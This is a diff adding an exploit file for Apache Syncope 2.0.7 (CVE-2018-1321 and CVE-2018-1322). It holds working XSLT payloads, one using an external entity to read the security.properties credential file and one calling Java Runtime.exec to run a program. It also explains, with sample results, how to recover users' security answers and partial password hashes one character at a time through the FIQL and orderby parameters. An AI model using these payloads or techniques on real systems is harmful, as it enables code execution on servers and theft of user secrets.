@@ -1,0 +1,75 @@
+# Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution
+# Date: 2018-09-12
+# Exploit Author: Che-Chun Kuo
+# Vendor Homepage: https://syncope.apache.org/
+# Software Link: http://archive.apache.org/dist/syncope/
+# Version: 2.0.7
+# Tested on: Windows
+# Advisory: https://syncope.apache.org/security
+# CVE: CVE-2018-1321, CVE-2018-1322
+
+# Vulnerability 1: Remote code execution by users with report and template privileges
+# Description: A user with access to the Reports and Templates functionality can use XSL Transformations (XSLT) 
+# to perform malicious operations, including but not limited to file read, file write, and code execution. 
+
+# Apache Syncope uses XSLT to export report data into various formats. An attacker can perform malicious 
+# operations by crafting a XSL template, binding the template to a report, executing, then exporting the report. 
+# The following XSL can be used to read the Syncope security.properties file or execute the Windows 
+# calc program, respectively.  
+
+READ security.properties file
+-------------------------------------------
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xsl:stylesheet [<!ENTITY file SYSTEM "..\webapps\syncope\WEB-INF\classes\security.properties">]>
+<xsl:stylesheet version="1.0" 
+	xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/">&file;</xsl:template>
+</xsl:stylesheet>
+
+EXECUTE Windows calc program
+-------------------------------------------
+<xsl:stylesheet version="1.0" 
+	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+	xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"
+	xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process">
+    <xsl:variable name="rtobject" select="runtime:getRuntime()"/>
+    <xsl:variable name="process" select="runtime:exec($rtobject,'calc')"/>
+    <xsl:variable name="waiting" select="process:waitFor($process)"/>
+    <xsl:value-of select="$process"/>
+</xsl:stylesheet>
+	
+# Vulnerability 2: Information disclosure via FIQL and ORDER BY sorting
+# Description: A user with entitlements to the /syncope/rest/users endpoint can recover sensitive 
+# security values using the fiql and orderby parameters. 
+
+# By default, Apache Syncope prevents sensitive values from being returned when querying 
+# the /syncope/rest/users endpoint. Fields such as securityAnswers or password will always return null. 
+# However the results returned can be filtered or sorted based on sensitive fields. By measuring how 
+# the results are returned the values of the desired fields can be successfully recovered. The fiql parameter 
+# can be used to recover full security answers, and the orderby parameter can be used to recover 
+# full security answers and partial information about password hashes. 
+
+# The fiql parameter allows filtering based on user attributes, including a user's security answer. 
+# By using FIQL filters (i.e. "securityAnswer==a*", "securityAnswer==b*", etc...) a user's 
+# securityAnswer can be recovered one letter at a time. 
+
+# The orderby parameter allows sorting based on user attributes, including a user's security 
+# answer and password. The following example shows how orderby sorting can be exploited. 
+
+# User Bob exists with the security answer "test". A malicious user creates a user Alice with the 
+# security answer "ta". The malicious actor then calls the /syncope/rest/users endpoint with orderby=securityAnswer".
+# By sorting using the "securityAnswer" attribute, the result will have Alice sorted ahead of Bob, 
+# due to the value "ta" being before the value "test". By sequentially changing Alice's security 
+# question and comparing the sorted result, Bob's security answer can be recovered one letter 
+# at a time. A similar technique can be used to reveal partial information about user password hashes.
+
+Orderby Example Results: 
+Alice's security answer, Order of results returned
+ta, [Alice, Bob]
+tb, [Alice, Bob]
+tc, [Alice, Bob]
+td, [Alice, Bob]
+te, [Alice, Bob]
+tf, [Bob, Alice]
+tea, [Alice, Bob]
+teb, [Alice, Bob]
